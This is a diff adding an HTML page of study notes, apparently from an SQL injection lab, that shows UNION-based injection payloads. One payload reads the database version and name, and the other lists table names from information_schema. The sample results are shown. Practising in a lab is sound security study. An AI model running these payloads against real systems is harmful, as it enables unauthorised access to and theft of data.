@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Extracting the data</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Extracting the data</h1><br/><br />We will be using <strong>UNION</strong> statements to dump the database info.<br /><br />NOTE: Columns on both sides of UNION should be the same.<br /><br />As we can see in the previous section we have 2 columns, so the UNION statement must have 2 columns too.<br /><br />a) Getting database and version.<br /><br />    Insert: &quot;)<strong> union select version(),database()</strong> #<br />    <br />    <a href=""><img src="images/155-1.png" alt="images/155-1.png" /></a><br /><br />    Result: Your Login name:<strong>8.0.22-0ubuntu0.20.04.3</strong>. Your Password:<strong>security</strong>.<br /><br />b) Getting table names on “security” table.<br /><br />    Insert: &quot;) union select 1, <strong>table_name  from information_schema.tables where table_schema=&quot;security&quot;</strong> #.<br />    <br />    <a href=""><img src="images/155-2.png" alt="images/155-2.png" /></a><br /><br />    Result: Your Login name:1. Your Password:<strong>emails</strong>.<br /><br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
